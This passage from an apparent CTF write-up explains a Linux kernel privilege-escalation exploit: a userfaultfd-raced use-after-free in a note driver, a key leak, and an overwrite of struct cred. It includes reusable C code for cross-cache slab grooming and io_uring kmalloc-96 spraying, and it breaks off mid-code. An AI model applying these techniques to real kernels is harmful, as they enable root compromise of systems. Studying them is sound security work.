<p>The note N that we’re going to target will have a backing allocation A allocated in <code class="language-plaintext highlighter-rouge">kmalloc-96</code>. This is important because <code class="language-plaintext highlighter-rouge">struct cred</code> its cache has 192-byte objects, so if we reallocate A as a <code class="language-plaintext highlighter-rouge">struct cred</code> eventually, there is a nice 50% chance that the object is aligned to the beginning of the cred. Using a <code class="language-plaintext highlighter-rouge">kmalloc-192</code> object would be a 100% chance, but that would have required us to overwrite at least 128 bytes of the cred and thus corrupted pointers like <code class="language-plaintext highlighter-rouge">cred-&gt;user_ns</code>, and we don’t have a leak to succesfully fake that.</p>

<p>We’ll exploit this as follows:</p>

<ol>
  <li>Submit <code class="language-plaintext highlighter-rouge">IO_EDIT</code> E1 for N, block on <code class="language-plaintext highlighter-rouge">data.addr</code> access.</li>
  <li>Submit <code class="language-plaintext highlighter-rouge">IO_EDIT</code> E2 for N, block on <code class="language-plaintext highlighter-rouge">data.addr</code> access as well (on a different page).</li>
  <li>Submit <code class="language-plaintext highlighter-rouge">IO_DEL</code> for N, which will free A and N.</li>
  <li>Reallocate A as something that we can read from later (A’).</li>
  <li>Submit <code class="language-plaintext highlighter-rouge">IO_ADD</code> to create a new note (N’).
    <ul>
      <li>This is needed because otherwise the <code class="language-plaintext highlighter-rouge">table[data.idx]-&gt;key</code> read in the <code class="language-plaintext highlighter-rouge">IO_EDIT</code> path will crash because <code class="language-plaintext highlighter-rouge">table[data.idx]</code> is reset to <code class="language-plaintext highlighter-rouge">NULL</code>.</li>
    </ul>
  </li>
  <li>Use the userfaultfd to fault in a page filled with zero bytes to unblock E1.
    <ul>
      <li>The <code class="language-plaintext highlighter-rouge">IO_EDIT</code> path of E1 will resume and XOR the new <code class="language-plaintext highlighter-rouge">table[data.idx]-&gt;key</code> with zero, resulting in… the key!</li>
    </ul>
  </li>
  <li>Read from A’ to leak the key.</li>
  <li>Free A’ again and reallocate it as a<code class="language-plaintext highlighter-rouge">struct cred</code> that is used for a child process.</li>
  <li>Use the userfaultfd to fault in a page that contains a fake (partial) <code class="language-plaintext highlighter-rouge">struct cred</code>, XORed with the key we just leaked.
    <ul>
      <li>The <code class="language-plaintext highlighter-rouge">IO_EDIT</code> path of E2 will resume and overwrite (part of) the <code class="language-plaintext highlighter-rouge">struct cred</code> with our fake version, giving it full root privileges!</li>
    </ul>
  </li>
  <li>Use the root privs to do nefarious things like loading a kernel module to exploit the hypervisor.</li>
</ol>

<p><em>Note bene: you can skip the whole two-stage approach and key leak if you make a single <code class="language-plaintext highlighter-rouge">IO_EDIT</code> fault twice in <code class="language-plaintext highlighter-rouge">copy_from_user</code>. This will write your contents to the target directly without performing the XOR afterwards. It also would enable us to use a kmalloc-192 object. I didn’t think of this during the CTF ://</em></p>

<p>Ok… easier said than done of course! There’s a few things we have to figure out: let’s start with how we’re going to reallocate A -&gt; A’ (original backing buffer -&gt; “something we can read from”).</p>

<p>I ended up skipping same cache shenanigans, and released the slab that A resides on to the page allocator directly. We’re going to need to do this anyway to reallocate A as (part of) a <code class="language-plaintext highlighter-rouge">struct cred</code>, so why not do it now? After we’ve done this, we can trivially reallocate it as e.g. the backing of a pipe, which we can read from. Note the <code class="language-plaintext highlighter-rouge">alloc_page()</code> call in <code class="language-plaintext highlighter-rouge">pipe_write()</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">ssize_t</span>
<span class="nf">pipe_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">iocb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">from</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">//[...]</span>
    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">readers</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">send_sig</span><span class="p">(</span><span class="n">SIGPIPE</span><span class="p">,</span> <span class="n">current</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EPIPE</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">head</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span> <span class="p">{</span>
            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">head</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>
            <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span><span class="p">;</span>
            <span class="kt">int</span> <span class="n">copied</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">(</span><span class="n">GFP_HIGHUSER</span> <span class="o">|</span> <span class="n">__GFP_ACCOUNT</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">?</span> <span class="o">:</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">//[...]</span>
        <span class="p">}</span>
        <span class="c1">//[...]</span>
    <span class="p">}</span>
    <span class="c1">//[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To succesfully release the order 0 slab that A resides on to the page allocator again, we’ll have to trick the SLUB allocator a bit. Even if all objects on a given slab are freed, this does not automatically free the slab to the page allocator. First, SLUB tries to put the slab on a so called <em>per-cpu partial list</em>, so that it can be reused for other allocations in the same cache. The underlying thought is that keeping the pages cached for a bit will save latency for future allocations in that cache, because issuing a new slab will only require taking it from the per-cpu partial list vs. a relatively expensive call into the page allocator.</p>

<p>Of course it wouldn’t be ideal if all these pages allocated for slabs could never be reused anywhere else again, so the partial list its capacity is bounded. This capacity can be found by reading <code class="language-plaintext highlighter-rouge">/sys/kernel/slab/$yourslab/cpu_partial</code> as root. For the challenge, <code class="language-plaintext highlighter-rouge">kmalloc-96</code> its cpu_partial was set to 30 slabs.</p>

<p>If the partial list is already full, a slab that has no active objects anymore <em>will</em> be released back to the page allocator, which is exactly what we want. So we’ll have to fill the partial list up with a bunch of junk slabs first.</p>

<p>For a more detailed description, I would recommend reading <a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary">this section of the CVE-2022-29582 writeup I worked on</a>.</p>

<p>Generally all the grooming to release a slab to the page allocator can be abstracted quite neatly. It ended up looking like this (mostly lifted from the <code class="language-plaintext highlighter-rouge">CVE-2022-29582</code> exploit as well):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">#define OBJS_PER_SLAB 32
#define CPU_PARTIAL 30
</span>
<span class="cp">#define CC_OVERFLOW_FACTOR 8
</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_allocate</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
                                  <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
                                  <span class="kt">uint32_t</span> <span class="n">to_alloc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_alloc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">int64_t</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">allocate</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ref</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ref</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
                              <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
                              <span class="kt">uint32_t</span> <span class="n">to_free</span><span class="p">,</span>
                              <span class="n">bool</span> <span class="n">per_slab</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_free</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">per_slab</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="n">cc</span><span class="o">-&gt;</span><span class="n">free</span><span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
            <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
 * Reserve enough objects to later overflow the per-cpu partial list */</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">reserve_partial_list_amount</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
    <span class="n">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">allocate_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">fill_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">empty_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">overflow_partial_list</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">free_all</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int64_t</span> <span class="nf">cc_next</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">CC_RESERVE_PARTIAL_LIST</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">reserve_partial_list_amount</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_ALLOC_VICTIM_PAGE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">allocate_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_FILL_VICTIM_PAGE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">fill_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_EMPTY_VICTIM_PAGE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="k">case</span> <span class="n">CC_OVERFLOW_PARTIAL_LIST</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">overflow_partial_list</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
    <span class="nl">default:</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="nf">cc_init</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">,</span>
                            <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">,</span>
                            <span class="kt">void</span> <span class="o">*</span><span class="n">allocate_fptr</span><span class="p">,</span>
                            <span class="kt">void</span> <span class="o">*</span><span class="n">free_fptr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cc</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"init_cross_cache:malloc</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">=</span> <span class="n">objs_per_slab</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">=</span> <span class="n">cpu_partial</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">free</span> <span class="o">=</span> <span class="n">free_fptr</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">allocate</span> <span class="o">=</span> <span class="n">allocate_fptr</span><span class="p">;</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span> <span class="o">=</span> <span class="n">CC_RESERVE_PARTIAL_LIST</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">n_overflow</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">n_previctim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">n_postvictim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_overflow</span><span class="p">);</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_previctim</span><span class="p">);</span>
    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_postvictim</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">cc</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And then qua integration in the exploit:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">kmalloc96_cc</span> <span class="o">=</span> <span class="n">cc_init</span><span class="p">(</span><span class="n">OBJS_PER_SLAB</span><span class="p">,</span> <span class="n">CPU_PARTIAL</span><span class="p">,</span> <span class="n">cc_alloc_kmalloc96</span><span class="p">,</span> <span class="n">cc_free_kmalloc96</span><span class="p">);</span>
    <span class="c1">//[...]</span>
    <span class="cm">/* allocate a bunch of kmalloc96 objects, so the next one we allocate will fall into our "victim page" */</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span>
    <span class="n">note_add</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mi">96</span><span class="p">);</span>

    <span class="cm">/* also fill up the victim page */</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span>
    <span class="c1">//[...]</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">userfault_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span> <span class="cm">/* free surrounding objects*/</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span> <span class="cm">/* fill up partial lists */</span>

    <span class="cm">/* sleep for rcu*/</span>
    <span class="n">usleep</span><span class="p">(</span><span class="mi">200000</span><span class="p">);</span>
    
    <span class="cm">/* free backing buffer in kmalloc-96 and release its slab back to the page allocator. */</span>
    <span class="n">note_del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="c1">//[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>for <code class="language-plaintext highlighter-rouge">cc_alloc_kmalloc96</code> and <code class="language-plaintext highlighter-rouge">cc_free_kmalloc96</code> i used a nice primitive in <code class="language-plaintext highlighter-rouge">io_uring</code> that allows for spraying an unlimited amount of objects in <code class="language-plaintext highlighter-rouge">kmalloc-96</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">uring_spray_fd</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int64_t</span> <span class="nf">cc_alloc_kmalloc96</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* This will allocate a io uring identity in kmalloc-96. It can be repeated an arbitrary amount of times for a single uring instance. */</span>
    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_register</span><span class="p">,</span> <span class="n">uring_spray_fd</span><span class="p">,</span> <span class="n">IORING_REGISTER_PERSONALITY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"alloc: io_uring_register() failed"</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">cc_free_kmalloc96</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">personality</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_register</span><span class="p">,</span> <span class="n">uring_spray_fd</span><span class="p">,</span> <span class="n">IORING_UNREGISTER_PERSONALITY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">personality</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"free: io_uring_register() failed"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Which corresponds to the following kernel code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">io_register_personality</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_ring_ctx</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">io_identity</span> <span class="o">*</span><span class="n">iod</span><span class="p">;</span>
	<span class="n">u32</span> <span class="n">id</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

	<span class="n">iod</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">iod</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span> <span class="cm">/* sizeof (*iod) == 72 -&gt; kmalloc-96 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">iod</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>

	<span class="n">io_init_identity</span><span class="p">(</span><span class="n">iod</span><span class="p">);</span>
	<span class="n">iod</span><span class="o">-&gt;</span><span class="n">creds</span> <span class="o">=</span> <span class="n">get_current_cred</span><span class="p">();</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">xa_alloc_cyclic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">personalities</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">id</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">iod</span><span class="p">,</span>
			<span class="n">XA_LIMIT</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">USHRT_MAX</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">pers_next</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">put_cred</span><span class="p">(</span><span class="n">iod</span><span class="o">-&gt;</span><span class="n">creds</span><span class="p">);</span>
		<span class="n">kfree</span><span class="p">(</span><span class="n">iod</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">id</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Then, to reallocate the slab as the backing buffer for a pipe, and subsequently read it out again:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">userfault_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
